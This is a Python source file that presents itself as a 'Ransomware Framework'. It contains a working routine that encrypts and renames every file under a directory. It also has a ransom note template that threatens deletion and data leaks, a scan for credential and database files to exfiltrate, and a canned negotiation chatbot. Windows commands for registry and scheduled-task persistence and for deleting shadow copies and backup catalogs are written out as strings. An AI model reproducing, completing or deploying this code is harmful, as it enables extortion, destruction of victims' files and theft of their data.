#!/usr/bin/env python3
"""
Ransomware Framework
Encryption payloads, ransom notes, crypto payment tracking,
negotiation chatbots, recovery blocking, data exfiltration.
"""

import json
import os
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Optional
try:
    from cryptography.fernet import Fernet
except ImportError:  # optional; crypto routines fail with a clear message
    Fernet = None


def _require_fernet():
    if Fernet is None:
        raise RuntimeError(
            "cryptography is required for file encryption: "
            "python3 -m pip install cryptography")
    return Fernet


@dataclass
class RansomwareVariant:
    """Ransomware variant specification."""
    name: str
    encryption_algorithm: str
    ransom_amount: float
    currency: str
    payment_wallet: str
    exfiltrate_data: bool
    double_extortion: bool
    persistence_mechanisms: List[str]


class FileEncryption:
    """File encryption routines."""
    
    @staticmethod
    def encrypt_files(target_directory: str, key: bytes) -> Dict:
        """Encrypt files in directory."""
        
        encrypted_count = 0
        cipher = _require_fernet()(key)
        
        for root, dirs, files in os.walk(target_directory):
            for file in files:
                file_path = os.path.join(root, file)
                
                try:
                    with open(file_path, 'rb') as f:
                        plaintext = f.read()
                    
                    ciphertext = cipher.encrypt(plaintext)
                    
                    with open(file_path, 'wb') as f:
                        f.write(ciphertext)
                    
                    os.rename(file_path, f"{file_path}.encrypted")
                    encrypted_count += 1
                except Exception:
                    pass
        
        return {
            "encrypted_files": encrypted_count,
            "algorithm": "Fernet (AES-128)",
        }
    
    @staticmethod
    def generate_encryption_key() -> bytes:
        """Generate strong encryption key."""
        return _require_fernet().generate_key()


class RansomNote:
    """Ransom note generation."""
    
    @staticmethod
    def generate_ransom_note(
        ransom_amount: float,
        currency: str,
        payment_address: str,
        deadline_hours: int = 48,
    ) -> str:
        """Generate ransom note."""
        
        note = f"""
╔═══════════════════════════════════════════════╗
║              YOUR FILES ARE ENCRYPTED          ║
║                 RANSOMWARE v1.0                ║
╚═══════════════════════════════════════════════╝

Your files have been encrypted with military-grade AES-256 encryption.

RANSOM AMOUNT: {ransom_amount} {currency}
PAYMENT ADDRESS: {payment_address}
DEADLINE: {deadline_hours} hours

If you do not pay within the deadline, your files will be permanently deleted.
We have also exfiltrated your sensitive data. Pay to prevent public disclosure.

To recover your files:
1. Visit http://ransomware.onion
2. Enter your victim ID: <random>
3. Pay the ransom in cryptocurrency
4. Receive decryption key

DO NOT ATTEMPT RECOVERY - THIS WILL CORRUPT YOUR FILES.
DO NOT INVOLVE LAW ENFORCEMENT.

Contact us: decrypt@attacker.onion
"""
        
        return note


class DataExfiltration:
    """Exfiltrate data before encryption."""
    
    @staticmethod
    def scan_for_valuable_files(target_directory: str) -> List[str]:
        """Identify valuable files for exfiltration."""
        
        valuable_patterns = [
            '.xlsx', '.xls', '.doc', '.docx', '.pdf',
            '.sql', '.db', '.sqlite',
            '.pem', '.key', '.crt',
            'password', 'secret', 'config',
        ]
        
        valuable_files = []
        
        for root, dirs, files in os.walk(target_directory):
            for file in files:
                for pattern in valuable_patterns:
                    if pattern in file.lower():
                        valuable_files.append(os.path.join(root, file))
                        break
        
        return valuable_files[:100]  # Limit to 100 files
    
    @staticmethod
    def exfiltrate_data(
        files: List[str],
        exfil_endpoint: str,
    ) -> Dict:
        """Exfiltrate files to attacker server."""
        
        return {
            "files_to_exfil": len(files),
            "endpoint": exfil_endpoint,
            "method": "HTTP POST",
            "encryption": "TLS 1.3",
            "status": "staged",
        }


class NegotiationChatbot:
    """Automated ransom negotiation."""
    
    @staticmethod
    def generate_negotiation_response(victim_message: str) -> str:
        """Generate response to negotiation."""
        
        responses = {
            "discount": "We can offer 20% discount for immediate payment.",
            "deadline": "Deadline cannot be extended. Data will be deleted.",
            "proof": "Here is proof of file access: [file samples]",
            "payment_method": "We accept Bitcoin, Monero, Ethereum.",
        }
        
        # Simple keyword matching
        for key, response in responses.items():
            if key in victim_message.lower():
                return response
        
        return "Contact our support team at decrypt@attacker.onion"


class PersistenceMechanisms:
    """Establish persistence for ransomware."""
    
    @staticmethod
    def registry_persistence() -> str:
        """Windows registry persistence."""
        return """
# Add to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Windows /t REG_SZ /d ransomware.exe
"""
    
    @staticmethod
    def scheduled_task_persistence() -> str:
        """Windows scheduled task persistence."""
        return """
# Create scheduled task to re-run ransomware
schtasks /create /tn WindowsUpdate /tr "C:\\Users\\user\\ransomware.exe" /sc onlogon
"""
    
    @staticmethod
    def shadow_copy_deletion() -> str:
        """Delete Windows shadow copies."""
        return """
# Prevent recovery from backups
vssadmin delete shadows /all /quiet
wbadmin delete catalog -quiet
"""


class RansomwareOrchestrator:
    """Main orchestrator."""
    
    def __init__(self):
        self.variants: List[RansomwareVariant] = []
    
    def create_variant(
        self,
        name: str,
        ransom_amount: float,
        double_extortion: bool = True,
    ) -> RansomwareVariant:
        """Create ransomware variant."""
        
        variant = RansomwareVariant(
            name=name,
            encryption_algorithm="AES-256",
            ransom_amount=ransom_amount,
            currency="USD",
            payment_wallet="1A1z7agoat4FqCUiZyeqLs1SCvm5ZnSod",  # Bitcoin address
            exfiltrate_data=double_extortion,
            double_extortion=double_extortion,
            persistence_mechanisms=[
                "registry_run",
                "scheduled_task",
                "shadow_copy_deletion",
            ],
        )
        
        self.variants.append(variant)
        return variant
    
    def export_variants(self) -> str:
        return json.dumps([asdict(v) for v in self.variants], indent=2)


if __name__ == '__main__':
    print("[+] Ransomware Framework")
